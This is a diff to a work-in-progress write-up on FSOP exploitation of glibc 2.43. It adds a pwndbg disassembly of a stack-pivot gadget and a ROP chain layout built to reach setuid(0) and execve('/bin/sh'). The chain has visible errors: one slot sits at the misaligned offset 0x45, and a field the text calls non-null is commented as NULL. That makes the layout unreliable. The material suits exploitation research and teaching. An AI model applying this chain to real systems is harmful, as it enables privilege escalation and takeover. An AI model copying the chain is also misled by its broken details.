@@ -2,7 +2,7 @@
 
 **Note**: WIP. This explanation still needs some corrections and improvements.
 
-**FSOP: File Stream Oriented Programming**. The general idea is to abuse the vtable dispatch of \_IO_FILE_PLUS structs to achieve arbitrary function calls. This can potentially be escalated into a stack pivoting and ROP (can it?). All experiments done in latest glibc 2.43.
+**FSOP: File Stream Oriented Programming**. The general idea is to abuse the vtable dispatch of \_IO_FILE_PLUS structs to achieve arbitrary function calls. This can potentially be escalated into a stack pivoting and ROP. All experiments done in latest glibc 2.43.
 
 ## Sandbox environment
 
@@ -564,6 +564,62 @@ While we are here, just before the last indirect call, notice the state of the r
 
 RDI, RDX are pointing to the first byte of the FILE struct. So, rdi = pointer to memory we control. If the target function dereferences this pointer, we can place the pointed data at offset 0x0 of the file struct and control the first and third argument.
 
-## Next step
+## Stack pivoting
 
-Explore stack pivoting using RDX and ROP from there.
+At this point we can perform an arbitrary call with some controls over the registers. The idea at this point is to pivot the stack and escalate into arbitrary code execution using ROP.
+
+```asm
+pwndbg> disass __push___start_context
+Dump of assembler code for function __push___start_context:
+   0x00007f46729440d0 <+0>:	endbr64
+   0x00007f46729440d4 <+4>:	rdsspq rcx
+   0x00007f46729440d9 <+9>:	mov    rdx,rsp
+   0x00007f46729440dc <+12>:	mov    rsi,QWORD PTR [rdi+0xa0]
+   0x00007f46729440e3 <+19>:	lea    rsp,[rsi+0x8]
+   0x00007f46729440e7 <+23>:	mov    rsi,QWORD PTR [rdi+0x3b8]
+   0x00007f46729440ee <+30>:	mov    rax,QWORD PTR [rdi+0x3b0]
+   0x00007f46729440f5 <+37>:	rstorssp QWORD PTR [rax+rsi*1-0x8]
+   0x00007f46729440fb <+43>:	saveprevssp
+   0x00007f46729440ff <+47>:	call   0x7f4672944106 <__push___start_context+54>
+   0x00007f4672944104 <+52>:	jmp    0x7f4672944120 <__start_context>
+   0x00007f4672944106 <+54>:	rstorssp QWORD PTR [rcx-0x8]
+   0x00007f467294410b <+59>:	saveprevssp
+   0x00007f467294410f <+63>:	mov    rsp,rdx
+   0x00007f4672944112 <+66>:	ret
+End of assembler dump.
+```
+
+There is this stack-pivoting gadget `mov rsp, rdx` in `__push___start_context+63`. We already know RDX at the time of the arbitrary call, which is a pointer to the beginning of the FILE struct, and we control the content of the struct, so we can cotrol the pointed values. With this, we have everything we need to pivot the stack and start the ROP chain.
+
+## ROP
+
+There are still some limitations though to this ROP chain, if we remember from previous constrains on the \_IO_wdoallocbuf path. We can't set the \_IO_NO_WRITES flag on the `_flags` field, so the first gadget should have an address that doesnt set the 0x8 bit.
+
+This `ret` in `_nl_archive_subfreeres+96` will do the trick. This is not a real instruction of `_nl_archive_subfreeres` but it's a valid mid-instruction gadget, and it happen to be at an address that starts with 0x00, so it won't set the \_IO_NO_WRITES flag when it lands in the `_flags` field of the struct.
+
+```asm
+pwndbg> tele 0x7f4672919d00 1
+00:0000│     0x7f4672919d00 (_nl_archive_subfreeres+96) ◂— ret
+```
+
+The second limitation is that \_IO_write_base has to be null, so we can't place a gadget address there, we can workaround it by popping a 0x0 into a register.
+
+There is a third limitation we haven't mentioned, it is that \_IO_buf_base can not be 0x0, we can apply the same approach as in \_IO_write_base.
+
+The final limitation is that we can't overwrite the lock field, this is at offset 0x88, so we have 0x88/0x8 = 17 gadgets to ROP. That is planty of space. This the layout of our ROP chain in ace.py:
+
+```
+0x00: _nl_archive_subfreeres+96 # pointer to ret instruction with least significant byte as 0x00
+0x08: pop rdi gadget
+0x10: 0x0000000000000000
+0x18: pop rdi gadget
+0x20: 0x0000000000000000	# _IO_write_base as NULL
+0x28: address of setuid		# calling setuid(0), to prevent bash from dropping priviledges
+0x30: pop rsi gadget
+0x38: 0x0000000000000000	# _IO_buf_base as NULL
+0x40: pop rdi gadget
+0x45: "/bin/sh" string in libc
+0x50: address to execve		# call execve("/bin/sh", NULL)
+```
+
+At this point we have escalated to arbitrary code execution.
